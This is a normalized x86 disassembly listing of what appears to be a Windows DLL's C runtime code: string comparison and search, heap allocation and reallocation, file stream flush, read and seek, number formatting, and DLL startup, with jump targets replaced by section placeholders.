mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_1000cea3
push 0xc
push r--data
call sub_10011e54
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_10011e99
retn
push 0x4
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10011b6c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000cee9
sub_1000cef2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_1001347b
pop ecx
call sub_1001034f
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_10013433
push 0x1e
call sub_10013288
push 0xff
call sub_1000e6f3
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1000cea3
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_1001034f
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_1001347b
pop ecx
test eax eax
je r-xdata
call sub_1001034f
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_1000cfd0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1000d08e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_10012f31
pop ecx
push eax
call sub_10013bd6
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_1000d0f6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1000d08e
pop ecx
test eax eax
je r-xdata
push esi
call sub_1000d13e
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_10012f31
push eax
call sub_10013cb2
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_1000d13e
push 0x14
push r--data
call sub_10011e54
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d20f
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10011e99
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_10012154
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1000d1e0
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1000d0f6
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1000d0f6
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1000d218
push 0xc
push r--data
call sub_10011e54
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_1000d0f6
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d261
mov eax [ ebp - 0x1c ]
push esi
call sub_1000d13e
pop ecx
jmp r-xdata
call sub_10011e99
retn
sub_1000d274
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0xc ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] edi
je r-xdata
mov esi [ ebp + 0x14 ]
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx edi
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
xor edx edx
div [ ebp + 0xc ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edi
mov ebx edi
je r-xdata
mov [ ebp - 0x8 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax ]
push esi
push eax
call sub_10010398
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
jl r-xdata
mov eax edi
inc [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x8 ] eax
test eax eax
jg r-xdata
cmp [ ebp - 0x8 ] 0x0
mov edi ebx
je r-xdata
push esi
call sub_1000d08e
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
push edi
push [ ebp - 0x4 ]
push esi
call sub_10012f31
pop ecx
push eax
call sub_10013bd6
add esp 0xc
cmp eax 0xffffffff
je r-xdata
xor edx edx
mov eax ebx
div [ ebp - 0x8 ]
sub edi edx
push edi
push [ ebp - 0x4 ]
push [ esi ]
call sub_10013da0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp - 0x4 ] edi
jmp r-xdata
mov edi eax
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0xc ]
jmp r-xdata
mov ecx edi
cmp eax edi
ja r-xdata
mov edi [ ebp - 0xc ]
jmp r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
add [ ebp - 0x4 ] ecx
sub ebx ecx
cmp eax edi
jb r-xdata
mov ecx eax
sub_1000d3d6
push 0xc
push r--data
call sub_10011e54
xor esi esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x14 ]
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d274
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d44e
mov eax [ ebp - 0x1c ]
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
call sub_10011e99
retn
sub_1000d460
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1000d48d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_10012f31
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
push 0x1
push ebx
push eax
call sub_1001441c
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_1001034f
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_1001441c
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_1001441c
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_1000d62a
push 0xc
push r--data
call sub_10011e54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_1000d48d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d68e
mov eax [ ebp - 0x1c ]
call sub_1001034f
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10011e99
retn
sub_1000d6b9
push 0x10
push r--data
call sub_10011e54
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_1000cef2
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_1000c3e9
pop ecx
jmp r-xdata
call sub_10011e99
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_1001347b
pop ecx
call sub_1001034f
push 0x4
call sub_1001135a
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1001138d
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d7fd
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1001188b
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_1001347b
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_10011b6c
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1001034f
call sub_1001034f
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_1001347b
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001030d
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1001034f
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1001034f
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10013da0
push ebx
call sub_1001138d
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_100113bd
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_1001030d
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10013da0
push ebx
push [ ebp - 0x20 ]
call sub_100113bd
add esp 0x14
mov eax esi
sub_1000d8d4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_1001034f
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_1000d08e
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_1000d48d
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10012f31
pop ecx
push eax
call sub_1001441c
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_1000d95e
push 0xc
push r--data
call sub_10011e54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_1001034f
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10012113
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000d8d4
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d9d9
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_10011e99
retn
cmp edi 0x2
jne r-xdata
sub_1000d9e3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
mov [ ecx ] 0x2d
inc ecx
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ ecx ] dl
inc ecx
test eax eax
ja r-xdata
mov dl [ esi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ esi ] al
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_1000da27
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_1000d9e3
mov eax [ ebp + 0xc ]
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_1000da4e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001009b
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1001009b
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_10014800
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_1000db40
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000da4e
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_10014800
sub_1000db9e
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0xc ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_100105a2
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
pop ebx
leave
retn
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10010398
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax esi
pop esi
sub_1000dc36
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push esi
call sub_10014870
xor edi edi
pop ecx
cmp esi edi
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
call sub_1001034f
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
pop edi
leave
retn
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp - 0x1c ] eax
sub_1000dca0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_100149c5
call sub_1000dc36
add esp 0x10
pop esi
pop ebp
retn
sub_1000dcc2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
push eax
call sub_1001113a
pop ecx
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1000ff0e
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1000fb86
push 0x214
push 0x1
call sub_100159c7
mov esi eax
pop ecx
pop ecx
cmp esi edi
je r-xdata
dec [ rw-data ]
cmp [ rw-data ] edi
jne r-xdata
call sub_10015f1d
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10015de6
mov [ rw-data ] eax
call sub_10014105
test eax eax
jge r-xdata
call sub_1001116a
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
xor eax eax
inc eax
push edi
call sub_1000fea0
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call sub_1000fb0b
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1000e93b
call sub_10015d2b
test eax eax
jl r-xdata
call sub_1000fbba
jmp r-xdata
push esi
call sub_1000c3e9
pop ecx
jmp r-xdata
push edi
push esi
call sub_1000fbf7
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
call sub_10014359
call sub_1000fbba
call sub_1001116a
jmp r-xdata
call sub_10014359
jmp r-xdata
call sub_10015ab3
test eax eax
jl r-xdata
push 0x0
call sub_1000e75e
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1000ddf7
push 0xc
push r--data
call sub_10011e54
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10001420
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1000dcc2
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1000dcc2
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10001420
push edi
push 0x0
push ebx
call sub_1000dcc2
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10011e99
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
